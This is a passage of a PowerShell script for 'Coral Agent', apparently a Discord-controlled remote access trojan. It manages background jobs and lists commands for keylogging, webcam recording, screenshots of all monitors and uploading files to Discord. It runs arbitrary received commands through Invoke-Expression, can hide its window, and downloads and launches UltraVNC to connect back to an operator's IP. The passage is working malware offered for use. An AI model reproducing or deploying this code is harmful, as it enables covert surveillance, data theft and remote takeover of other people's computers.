    if($script:Jobs.ContainsKey($JobName)) {
        $script:Jobs[$JobName].State -eq 'Completed'
    }
}

function List_AgentJobs {
    $jobList = @()
    foreach ($JobName in $script:Jobs.Keys) {
        $job = $script:Jobs[$JobName]
        $status = $job.State
        $jobList += [PSCustomObject]@{
            JobName = $JobName
            Status  = $status
            JobId = $job.Id
        }
    }
    
    if ($jobList.Count -eq 0) {
        sendMsg -Message "**No active jobs found**"
        return
    }
    
    $msg = "**Active Jobs:**`n"
    foreach ($job in $jobList) {
        $msg += "**$($job.JobName)** (ID: $($job.JobId)) - Status: $($job.Status)`n"
    }
    sendMsg -Message $msg
}

function Remove_AgentJob {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        try {
            Stop-Job -Job $job -Force
        } catch {}
        Remove-Job -Job $job -Force
        $script:Jobs.Remove($JobName)
        sendMsg -Message " **Job Removed:** ``$JobName``"
    } else {
        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
    }
}

function Get_AgentJobOutput {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        $output = Receive-Job -Job $job -Keep -ErrorAction SilentlyContinue
        
        $errors = @()
        foreach ($childJob in $job.ChildJobs) {
            if ($childJob.Error.Count -gt 0) {
                $errors += $childJob.Error | ForEach-Object { $_.Exception.Message }
            }
        }
        
        $msg = ":page_facing_up: **Job Output - $JobName :**`n"
        
        if ($output) {
            $result = $output | Out-String
            if ($result.Length -gt 1500) {
                $result = $result.Substring(0, 1500) + "... (truncated)"
            }
            $msg += "**Output:**```$result```""
        } else {
            $msg += "**Output:** No output available`n"
        }
        
        if ($errors.Count -gt 0) {
            $errorText = $errors -join "`n"
            if ($errorText.Length -gt 500) {
                $errorText = $errorText.Substring(0, 500) + "... (truncated)"
            }
            $msg += "`n**Errors:**```$errorText```""
        } else {
            $msg += "`n**Errors:** No errors```""
        }
        
        sendMsg -Message $msg
    } else {
        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
    }
}

function Get_AgentJobStatus {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        
        $msg = ":gear: **Job Status - $JobName :**`n"
        $msg += "**State:** $($job.State)`n"
        $msg += "**Has More Data:** $($job.HasMoreData)`n"
        $msg += "**Start Time:** $($job.PSBeginTime)`n"
        $msg += "**End Time:** $($job.PSEndTime)`n"
        
        if ($job.State -eq "Failed") {
            $failureReason = $job.ChildJobs[0].JobStateInfo.Reason
            if ($failureReason) {
                $msg += "**Failure Reason:** $($failureReason.Message)`n"
            }
        }
        
        $errorCount = ($job.ChildJobs | ForEach-Object { $_.Error.Count } | Measure-Object -Sum).Sum
        $msg += "**Error Count:** $errorCount"
        
        sendMsg -Message $msg
    } else {
        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
    }
}

function Stop_AllAgentJobs {
    if ($script:Jobs.Count -eq 0) {
        sendMsg -Message ":information_source: **No jobs to stop**"
        return
    }
    
    $stoppedCount = 0
    foreach ($JobName in @($script:Jobs.Keys)) {
        try {
            $job = $script:Jobs[$JobName]
            Stop-Job -Job $job -Force
            Remove-Job -Job $job -Force
            $script:Jobs.Remove($JobName)
            $stoppedCount++
        } catch {}
    }
    sendMsg -Message ":stop_sign: **Stopped $stoppedCount job(s)**"
}

function Check_CompletedJobs {
    foreach ($JobName in @($script:Jobs.Keys)) {
        if (Get_AgentJobCompleted -JobName $JobName) {
            $job = $script:Jobs[$JobName]
            $output = Receive-Job -Job $job -ErrorAction SilentlyContinue
            $errors = ($job.ChildJobs | ForEach-Object { $_.JobStateInfo.Reason }) -join "`n"
            Remove-Job -Job $job
            $script:Jobs.Remove($JobName)
            
            $msg = ":checkered_flag: **Job Completed - $JobName**"
            if ($output) {
                $result = $output | Out-String
                if ($result.Length -gt 1600) {
                    $result = $result.Substring(0, 1600) + "... (truncated)"
                }
                $msg += "```$result```""
            }
            if ($errors) { 
                $msg += "`n:warning: **Errors:**`n```$errors```""
            }
            sendMsg -Message $msg
        }
    }
}

# =============================== UVNC FUNCTIONS ===============================
Function StartUvnc {
    param([string]$ip,[string]$port)
    sendMsg -Message "Set up UVNC Lister, IP: $ip, Port: $port"
    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
    $tempFolder = "$env:temp\vnc"
    $vncDownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/UltraVNC.zip"
    $vncZip = "$tempFolder\UltraVNC.zip" 
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }  
    if (!(Test-Path -Path $vncZip)) {
        Iwr -Uri $vncDownload -OutFile $vncZip
    }
    Start-Sleep 1
    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
    Start-Sleep 1 
    rm -Path $vncZip -Force  
    $proc = "$tempFolder\winvnc.exe"
    Start-Process $proc -ArgumentList ("-run")
    Start-Sleep 2
    Start-Process $proc -ArgumentList ("-connect $ip::$port")
}

Function RemoveUVNC {
    sendMsg -Message ":wastebasket: ``Removing UVNC files...`` :wastebasket:"
    $tempFolder = "$env:temp\vnc"
    if (Test-Path -Path $tempFolder) {
        rm -Path $tempFolder -Force 
    }
}

# =============================== PROCESS MANAGEMENT ===============================
function Check_ScriptAlreadyRunning {
    param([bool]$UseDiscord = $false)
    
    try {
        $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
        $mutex = $null
        
        try {
            $mutex = [System.Threading.Mutex]::new($false, $mutexName)
            
            if (-not $mutex.WaitOne(100)) {
                if ($UseDiscord) {
                    sendMsg -Message ":warning: **Another instance of Coral Agent is already running!**"
                    sendMsg -Message ":no_entry: **This instance will now exit to prevent conflicts**"
                } else {
                    
                }
                [Environment]::Exit(1)
            }
            
            $global:CoralMutex = $mutex
            
        } catch [System.Threading.AbandonedMutexException] {
            if ($UseDiscord) {
                sendMsg -Message ":warning: **Previous instance didn't exit cleanly, taking over...**"
            } else {
                #Write-Host "Previous instance didn't exit cleanly, taking over..."
            }
        }
    } catch {
        if ($UseDiscord) {
            sendMsg -Message ":warning: **Error during process check:** $($_.Exception.Message)"
        } else {
            #Write-Host "Error during process check: $($_.Exception.Message)"
        }
    }
}

function Cleanup_CoralAgent {
    try {
        if ($global:CoralMutex) {
            $global:CoralMutex.ReleaseMutex()
            $global:CoralMutex.Dispose()
        }
        if ($script:Jobs.Count -gt 0) { Stop_AllAgentJobs }
        if ($global:keyloggerstatus) { Stop_Keylogger }
    } catch {}
}

trap { try { Cleanup_CoralAgent } catch {}; continue }

# =============================== HELP MENU ===============================
function display_help {
    $message = "
:robot: **Coral Agent Help Menu:**

**Basic Commands:**
- **TEST:** Test the connection to the Coral Network
- **HELP:** Display this help menu
- **EXIT:** Disconnect from the Coral Network

**Job Management:**
- **JOBS:** List all active jobs with their status
- **CREATEJOB <command>:** Create a new background job
- **DELETEJOB <jobname>:** Stop and remove a specific job
- **JOBOUTPUT <jobname>:** Get output and errors from a job
- **JOBSTATUS <jobname>:** Get detailed status of a job
- **STOPALLJOBS:** Stop all running jobs

**Keylogger Commands:**
- **STARTKEYLOG:** Start keylogger with default 30-second intervals
- **STARTKEYLOG <seconds>:** Start keylogger with custom interval (1-300 seconds)
- **STOPKEYLOG:** Stop the keylogger
- **KEYLOGSTATUS:** Check keylogger status

**Webcam Commands:**
- **WEBCAM:** Record 1 second of webcam video

**Screenshot Commands:**
- **SCREENSHOTALL:** Take screenshots of all monitors

**File Operations:**
- **SENDFILE <filepath>:** Upload a file to Discord
- **DOWNLOADFILE [path]:** Download file attachments from Discord (optional custom path)

**UVNC Commands:**
- **STARTUVNC <ip> <port>:** Start the UVNC client
"
    sendMsg -Message $message
}

# =============================== INITIALIZATION ===============================
try {
    $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
    $global:CoralMutex = [System.Threading.Mutex]::new($false, $mutexName)
    if (-not $global:CoralMutex.WaitOne(100)) { [Environment]::Exit(1) }
} catch [System.Threading.AbandonedMutexException] {} catch {}

try { $global:botId = Get_BotUserId } catch { exit 1 }

try {
    if (!(CheckCategoryExists)) {
        NewChannelCategory
        NewChannel -name 'coral-control'
        $global:SessionID = $ChannelID
    } else {
        $global:SessionID = $ChannelID
    }
} catch { exit 1 }

if ($global:hidewindow) { try { HideWindow } catch {} }
try { sendMsg -Message "``$env:COMPUTERNAME connected to Coral Network``" } catch { exit 1 }

# =============================== MAIN LOOP ===============================
while ($true) {
    $latestMessage = PullMsg
    
    if ($latestMessage -and $latestMessage -ne $previousMessage) {
        $previousMessage = $latestMessage
        
        switch ($latestMessage) {
            'TEST' { sendMsg -Message "Test successful from $env:COMPUTERNAME" }
            'HELP' { display_help }
            'STARTKEYLOG' { Start_Keylogger }
            'STOPKEYLOG' { Stop_Keylogger }
            'KEYLOGSTATUS' { Get_KeyloggerStatus }
            'WEBCAM' { Webcam }
            'SCREENSHOTALL' { screenshot_all }
            'JOBS' { List_AgentJobs }
            'STOPALLJOBS' { Stop_AllAgentJobs }
            'EXIT' { 
                sendMsg -Message "**$env:COMPUTERNAME disconnecting from Coral Network**"
                Stop_AllAgentJobs
                RemoveUVNC
                Cleanup_CoralAgent
                exit 
            }
            default {
                if ($latestMessage -match "^CREATEJOB (.+)$") {
                    $scriptBlock = $matches[1]
                    Start_AgentJob -ScriptString $scriptBlock
                }
                elseif ($latestMessage -match "^DELETEJOB (.+)$") {
                    $jobName = $matches[1]
                    Remove_AgentJob -JobName $jobName
                }
                elseif ($latestMessage -match "^JOBOUTPUT (.+)$") {
                    $jobName = $matches[1]
                    Get_AgentJobOutput -JobName $jobName
                }
                elseif ($latestMessage -match "^JOBSTATUS (.+)$") {
                    $jobName = $matches[1]
                    Get_AgentJobStatus -JobName $jobName
                }
                elseif ($latestMessage -match "^SENDFILE (.+)$") {
                    $filePath = $matches[1].Trim()
                    if (Test-Path $filePath) {
                        sendFile -sendfilePath $filePath
                    } else {
                        sendMsg -Message ":x: **File not found:** ``$filePath``"
                    }
                }
                elseif ($latestMessage -match "^UVNC (.+) (.+)$") {
                    $ip = $matches[1].Trim()
                    $port = $matches[2].Trim()
                    StartUvnc -ip $ip -port $port
                }
                elseif ($latestMessage -match "^DOWNLOADFILE(.*)$") {
                    $downloadPath = $matches[1].Trim()
                    if (-not $downloadPath) { $downloadPath = $env:TEMP }
                    
                    if ($global:lastMessageAttachments -and $global:lastMessageAttachments.Count -gt 0) {
                        sendMsg -Message ":inbox_tray: **Starting download of $($global:lastMessageAttachments.Count) file(s)...**"
                        
                        foreach ($attachment in $global:lastMessageAttachments) {
                            $fileName = $attachment.filename
                            $fileUrl = $attachment.url
                            $fileSize = [math]::Round($attachment.size / 1KB, 2)
                            
                            sendMsg -Message ":arrow_down: **Downloading:** ``$fileName`` (${fileSize} KB)"
                            downloadFile -attachmentUrl $fileUrl -fileName $fileName -downloadPath $downloadPath
                        }
                    } else {
                        sendMsg -Message ":x: **No file attachments found in the message**"
                        sendMsg -Message ":information_source: **Usage:** Send a message with file attachments and the command ``DOWNLOADFILE [path]``"
                    }
                }
                elseif ($latestMessage -match "^STARTKEYLOG (\d+)$") {
                    $interval = [int]$matches[1]
                    if ($interval -ge 1 -and $interval -le 300) {
                        Start_Keylogger -intervalSeconds $interval
                    } else {
                        sendMsg -Message ":x: **Invalid interval. Use 1-300 seconds**"
                    }
                }
                else {
                    try {
                        $result = Invoke-Expression $latestMessage 2>&1
                        if ($result) {
                            $output = $result | Out-String
                            sendMsg -Message "``````$output``````"
                        } else {
                            sendMsg -Message "**Command executed successfully (no output)**"
                        }
                    } catch {
                        $errorMsg = $_.Exception.Message
                        if ($errorMsg.Length -gt 1000) {
                            $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                        }
                        sendMsg -Message ":x: ``Error: $errorMsg`` :x:"
                    }
                }
            }
        }
        Check_CompletedJobs
    }
    Start-Sleep -Seconds 3
}